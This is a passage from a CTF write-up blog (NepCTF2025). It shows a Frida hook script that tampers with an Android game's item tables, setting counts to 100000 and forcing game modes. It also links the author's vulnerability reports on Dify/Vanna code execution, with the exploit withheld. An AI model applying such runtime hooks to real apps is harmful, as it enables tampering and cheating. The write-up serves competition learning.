this[&quot;FollowAccessWait&quot;]();</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // let GameView = Java.use(&quot;jp.co.taito.am.gree.poptower.GameView&quot;);</span><br><span class="line">    GameView[&quot;visibleWebView&quot;].implementation = function (viewId, visible) &#123;</span><br><span class="line">        console.log(`GameView.visibleWebView is called: viewId=$&#123;viewId&#125;, visible=$&#123;visible&#125;`);</span><br><span class="line">        // this[&quot;visibleWebView&quot;](viewId, visible);</span><br><span class="line">    &#125;;</span><br><span class="line">    let TextureImpl = Java.use(&quot;jp.co.taito.am.gree.poptower.TextureManager$TextureImpl&quot;);</span><br><span class="line">    TextureImpl[&quot;createBitmap&quot;].implementation = function (key, type) &#123;</span><br><span class="line">        let fromDlResource = this.fromDlResource.value;</span><br><span class="line">        // console.log(`TextureImpl.createBitmap is called: key=$&#123;key&#125;, type=$&#123;type&#125;,fromDlResource=$&#123;fromDlResource&#125;`);</span><br><span class="line">        this.fromDlResource.value = false;</span><br><span class="line">        let result = this[&quot;createBitmap&quot;](key, type);</span><br><span class="line">        // console.log(`TextureImpl.createBitmap result=$&#123;result&#125;`);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ItemSelect[&quot;LastAccessWait&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`ItemSelect.LastAccessWait is called`);</span><br><span class="line">        this.is_Mode.value = 23;</span><br><span class="line">        // this[&quot;LastAccessWait&quot;]();</span><br><span class="line">        return;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ItemSelect[&quot;ResultLast&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`ItemSelect.ResultLast is called`);</span><br><span class="line">        this.is_Mode.value = 11</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ItemSelect[&quot;loadBin&quot;].implementation = function (fileName) &#123;</span><br><span class="line">        console.log(`ItemSelect.loadBin is called: fileName=$&#123;fileName&#125;`);</span><br><span class="line">        this[&quot;loadBin&quot;](fileName);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    // ItemSelect[&quot;GetItemMax&quot;].implementation = function (item_id) &#123;</span><br><span class="line">    //     console.log(`ItemSelect.GetItemMax is called: item_id=$&#123;item_id&#125;`);</span><br><span class="line">    //     let result = this[&quot;GetItemMax&quot;](item_id);</span><br><span class="line">    //     console.log(`ItemSelect.GetItemMax result=$&#123;result&#125;`);</span><br><span class="line">    //     return result;</span><br><span class="line">    // &#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ItemSelect[&quot;SetItemMax&quot;].implementation = function (item_id, cnt) &#123;</span><br><span class="line">        console.log(`ItemSelect.SetItemMax is called: item_id=$&#123;item_id&#125;, cnt=$&#123;cnt&#125;`);</span><br><span class="line">        this[&quot;SetItemMax&quot;](item_id, cnt);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    // ItemSelect[&quot;ItemSelectGetNumber&quot;].implementation = function (item_type, num) &#123;</span><br><span class="line">    //     console.log(`ItemSelect.ItemSelectGetNumber is called: item_type=$&#123;item_type&#125;, num=$&#123;num&#125;`);</span><br><span class="line">    //     let result = this[&quot;ItemSelectGetNumber&quot;](item_type, num);</span><br><span class="line">    //     console.log(`ItemSelect.ItemSelectGetNumber result=$&#123;result&#125;`);</span><br><span class="line">    //     return result;</span><br><span class="line">    // &#125;;</span><br><span class="line"></span><br><span class="line">    ItemSelect[&quot;IniItemMax&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`ItemSelect.IniItemMax is called`);</span><br><span class="line">        this[&quot;IniItemMax&quot;]();</span><br><span class="line">        let Arrays = Java.use(&quot;java.util.Arrays&quot;)</span><br><span class="line">        Arrays.fill(this.itemmax.value, 10);</span><br><span class="line">        console.log(this.itemID_A_tbl.value)</span><br><span class="line">        console.log(this.item_A_num.value)</span><br><span class="line">        console.log(this.item_A_set.value)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        let tablelen = 0;</span><br><span class="line"></span><br><span class="line">        // Arrays.fill(this.item_A_num.value, 10);</span><br><span class="line">        tablelen = this.item_A_set.value.length;</span><br><span class="line">        this.item_A_max.value = 0</span><br><span class="line">        for(let i=0;i&lt;tablelen;i++)&#123;</span><br><span class="line">            this.item_A_num.value[i] = this.itemID_A_tbl.value[i];</span><br><span class="line">            this.item_A_set.value[i] = i;</span><br><span class="line">            this.item_A_max.value += 1;</span><br><span class="line">            this.SetItemMax(this.itemID_A_tbl.value[i], 100000);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Arrays.fill(this.item_B_num.value, 10);</span><br><span class="line">        tablelen = this.item_B_set.value.length;</span><br><span class="line">        this.item_B_max.value = 0</span><br><span class="line">        for(let i=0;i&lt;tablelen;i++)&#123;</span><br><span class="line">            this.item_B_num.value[i] = this.itemID_B_tbl.value[i];</span><br><span class="line">            this.item_B_set.value[i] = i;</span><br><span class="line">            this.item_B_max.value += 1;</span><br><span class="line">            this.SetItemMax(this.itemID_B_tbl.value[i], 100000);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Arrays.fill(this.item_C_num.value, 10);</span><br><span class="line">        tablelen = this.item_C_set.value.length;</span><br><span class="line">        this.item_C_max.value = 0</span><br><span class="line">        for(let i=0;i&lt;tablelen;i++)&#123;</span><br><span class="line">            this.item_C_num.value[i] = this.itemID_C_tbl.value[i];</span><br><span class="line">            this.item_C_set.value[i] = i;</span><br><span class="line">            this.item_C_max.value += 1;</span><br><span class="line">            this.SetItemMax(this.itemID_C_tbl.value[i], 100000);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Arrays.fill(this.item_D_num.value, 10);</span><br><span class="line">        tablelen = this.item_D_set.value.length;</span><br><span class="line">        this.item_D_max.value = 0</span><br><span class="line">        for(let i=0;i&lt;tablelen;i++)&#123;</span><br><span class="line">            this.item_D_num.value[i] = this.itemID_D_tbl.value[i];</span><br><span class="line">            this.item_D_set.value[i] = i;</span><br><span class="line">            this.item_D_max.value += 1;</span><br><span class="line">            this.SetItemMax(this.itemID_D_tbl.value[i], 100000);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Arrays.fill(this.item_E_num.value, 10);</span><br><span class="line">        tablelen = this.item_E_set.value.length;</span><br><span class="line">        this.item_E_max.value = 0</span><br><span class="line">        for(let i=0;i&lt;tablelen;i++)&#123;</span><br><span class="line">            this.item_E_num.value[i] = this.itemID_E_tbl.value[i];</span><br><span class="line">            this.item_E_set.value[i] = i;</span><br><span class="line">            this.item_E_max.value += 1;</span><br><span class="line">            this.SetItemMax(this.itemID_E_tbl.value[i], 100000);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        console.log(&quot;----------------------&quot;)</span><br><span class="line">        console.log(this.itemID_A_tbl.value)</span><br><span class="line">        console.log(this.item_A_num.value)</span><br><span class="line">        console.log(this.item_A_set.value)</span><br><span class="line">        console.log(this.itemIC_A_tbl.value)</span><br><span class="line"></span><br><span class="line">        console.log(`ItemSelect.IniItemMax is over`);</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ItemSelect[&quot;SetSelectItemID&quot;].implementation = function (item_type, item_id) &#123;</span><br><span class="line">        console.log(`ItemSelect.SetSelectItemID is called: item_type=$&#123;item_type&#125;, item_id=$&#123;item_id&#125;`);</span><br><span class="line">        let result = this[&quot;SetSelectItemID&quot;](item_type, item_id);</span><br><span class="line">        console.log(`ItemSelect.SetSelectItemID result=$&#123;result&#125;`);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    // ItemSelect[&quot;ItemSelectGetMax&quot;].implementation = function (item_type) &#123;</span><br><span class="line">    //     console.log(`ItemSelect.ItemSelectGetMax is called: item_type=$&#123;item_type&#125;`);</span><br><span class="line">    //     let result = this[&quot;ItemSelectGetMax&quot;](item_type);</span><br><span class="line">    //     console.log(`ItemSelect.ItemSelectGetMax result=$&#123;result&#125;`);</span><br><span class="line">    //     return result;</span><br><span class="line">    // &#125;;</span><br><span class="line">    let Bejeweled = Java.use(&quot;jp.co.taito.am.gree.poptower.bejeweled_quick.Bejeweled&quot;);</span><br><span class="line">    // Bejeweled[&quot;initItemData_Helper&quot;].implementation = function (inType) &#123;</span><br><span class="line">    //     console.log(`Bejeweled.initItemData_Helper is called: inType=$&#123;inType&#125;`);</span><br><span class="line">    //     this[&quot;initItemData_Helper&quot;](inType);</span><br><span class="line">    // &#125;;</span><br><span class="line"></span><br><span class="line">    Bejeweled[&quot;setWebDataPointer&quot;].implementation = function (inBoot, outEnd, inItemSelect) &#123;</span><br><span class="line">        console.log(`Bejeweled.setWebDataPointer is called: inBoot=$&#123;inBoot&#125;, outEnd=$&#123;outEnd&#125;, inItemSelect=$&#123;inItemSelect&#125;`);</span><br><span class="line">        this[&quot;setWebDataPointer&quot;](inBoot, outEnd, inItemSelect);</span><br><span class="line">        this.initItemData();</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // ItemSelect[&quot;CreateGameMain&quot;].implementation = function (gameID) &#123;</span><br><span class="line">    //     console.log(`ItemSelect.CreateGameMain is called: gameID=$&#123;gameID&#125;`);</span><br><span class="line">    //     let result = this[&quot;CreateGameMain&quot;](gameID);</span><br><span class="line">    //     console.log(`ItemSelect.CreateGameMain result=$&#123;result&#125;`);</span><br><span class="line">    //     return result;</span><br><span class="line">    // &#125;;</span><br><span class="line">    </span><br><span class="line">    // ItemSelect[&quot;ItemSelectGetIDPos&quot;].implementation = function (item_id) &#123;</span><br><span class="line">    //     console.log(`ItemSelect.ItemSelectGetIDPos is called: item_id=$&#123;item_id&#125;`);</span><br><span class="line">    //     let result = this[&quot;ItemSelectGetIDPos&quot;](item_id);</span><br><span class="line">    //     console.log(`ItemSelect.ItemSelectGetIDPos result=$&#123;result&#125;`);</span><br><span class="line">    //     return result;</span><br><span class="line">    // &#125;;</span><br><span class="line"></span><br><span class="line">    // ItemSelect[&quot;GetItemDetail&quot;].implementation = function (item_id, sts) &#123;</span><br><span class="line">    //     console.log(`ItemSelect.GetItemDetail is called: item_id=$&#123;item_id&#125;, sts=$&#123;sts&#125;`);</span><br><span class="line">    //     let result = this[&quot;GetItemDetail&quot;](item_id, sts);</span><br><span class="line">    //     console.log(`ItemSelect.GetItemDetail result=$&#123;result&#125;`);</span><br><span class="line">    //     return result;</span><br><span class="line">    // &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exportfunction hook_main()&#123;</span><br><span class="line">    Java.perform(() =&gt; &#123;</span><br><span class="line">        java_hook();</span><br><span class="line">      &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frida -U -f jp.co.taito.am.gree.poptower -l _fcagent.js</span><br></pre></td></tr></table></figure></div>

<h2 id="Real-World-Dify"><a href="#Real-World-Dify" class="headerlink" title="Real_World_Dify"></a><strong>Real_World_Dify</strong></h2><p>为避免恶意传播，不提供EXP。只提供本人的漏洞报告。</p>
<p>Pandas注入LCE</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://huntr.com/bounties/a49baae1-4652-4d6c-a179-313c21c41a8d" >https://huntr.com/bounties/a49baae1-4652-4d6c-a179-313c21c41a8d <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Vanna供应链LCE</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://huntr.com/bounties/ea4bc85e-9639-42be-8db9-c0738025cb32" >https://huntr.com/bounties/ea4bc85e-9639-42be-8db9-c0738025cb32 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Dify+vanna 供应链RCE CVE-2025-0185</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://huntr.com/bounties/7d9eb9b2-7b86-45ed-89bd-276c1350db7e" >https://huntr.com/bounties/7d9eb9b2-7b86-45ed-89bd-276c1350db7e <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="T-A-S-P-W-N"><a href="#T-A-S-P-W-N" class="headerlink" title="T.A.S P.W.N"></a><strong>T.A.S P.W.N</strong></h2><p>See you next year 1500pt</p>

        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> NepCTF2025 WP</li>
        <li><strong>Author:</strong> xiaolaisec</li>
        <li><strong>Created at
                :</strong> 2025-08-07 12:30:05</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-08-19 00:04:37
            </li>
        
        <li>
            <strong>Link:</strong> https://redefine.ohevan.com/2025/08/07/NepCTF2025 WP/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/CTF/">#CTF</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/JAVA/">#JAVA</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/PHP/">#PHP</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/Python/">#Python</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2025/08/08/%E2%80%9C%E5%8D%8E%E4%B8%BA%E6%9D%AF%E2%80%9D%20%E4%B8%AD%E5%9B%BD%E7%A0%94%E7%A9%B6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E5%AE%9E%E7%BD%91%E5%AF%B9%E6%8A%97%E8%B5%9B/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">“华为杯”中国研究生网络安全创新大赛实网对抗赛赛题记录</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/08/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-URLDNS%E9%93%BE/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">java反序列化-URLDNS链</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          requiredMeta: ['nick', 'mail'],
          emoji: [],
          
          
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">NepCTF2025 WP</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GooGooVVVY"><span class="nav-text">GooGooVVVY</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fakeXSS"><span class="nav-text">fakeXSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaSeri"><span class="nav-text">JavaSeri</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#safe-bank"><span class="nav-text">safe_bank</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E9%9A%BE%E9%81%93%E4%B8%8D%E6%98%AFsql%E6%B3%A8%E5%85%A5%E5%A4%A9%E6%89%8D%E5%90%97"><span class="nav-text">我难道不是sql注入天才吗</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezRSA2"><span class="nav-text">ezRSA2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952"><span class="nav-text">方法2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0-%E8%87%B4%E8%B0%A2"><span class="nav-text">后记 &amp; 致谢</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lattice-Bros"><span class="nav-text">Lattice Bros</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nepsign"><span class="nav-text">Nepsign</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Transition"><span class="nav-text">Transition</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unloopshock"><span class="nav-text">unloopshock</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%BD%E4%BA%A7%E5%AF%86%E7%A0%81%E5%BA%94%E7%94%A8"><span class="nav-text">国产密码应用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ICS"><span class="nav-text">ICS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%96%AF%E9%A5%BC%E7%9A%84PLC"><span class="nav-text">薯饼的PLC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Factory-%E6%B0%B4%E7%BD%90-SIEM"><span class="nav-text">Factory - 水罐 SIEM</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easyshock"><span class="nav-text">easyshock</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MoewBle%E5%96%B5%E6%B3%A1"><span class="nav-text">MoewBle喵泡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NAS%E7%8B%97%E9%83%BD%E4%B8%8D%E7%8E%A9"><span class="nav-text">NAS狗都不玩</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NepBotEvent"><span class="nav-text">NepBotEvent</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SpeedMino"><span class="nav-text">SpeedMino</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A2%E6%9C%8D%E5%B0%8F%E7%BE%8E"><span class="nav-text">客服小美</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ASTRAY"><span class="nav-text">ASTRAY</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#canutrytry"><span class="nav-text">canutrytry</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HRPOS"><span class="nav-text">HRPOS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smallbox"><span class="nav-text">smallbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Time"><span class="nav-text">Time</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crackme"><span class="nav-text">Crackme</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FlutterPro"><span class="nav-text">FlutterPro</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QRS"><span class="nav-text">QRS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Realme"><span class="nav-text">Realme</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reboot"><span class="nav-text">reboot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SpeedMino-Warlock"><span class="nav-text">SpeedMino-Warlock</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSafe"><span class="nav-text">XSafe</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RW"><span class="nav-text">RW</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PopTower"><span class="nav-text">PopTower</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Real-World-Dify"><span class="nav-text">Real_World_Dify</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T-A-S-P-W-N"><span class="nav-text">T.A.S P.W.N</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>









<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
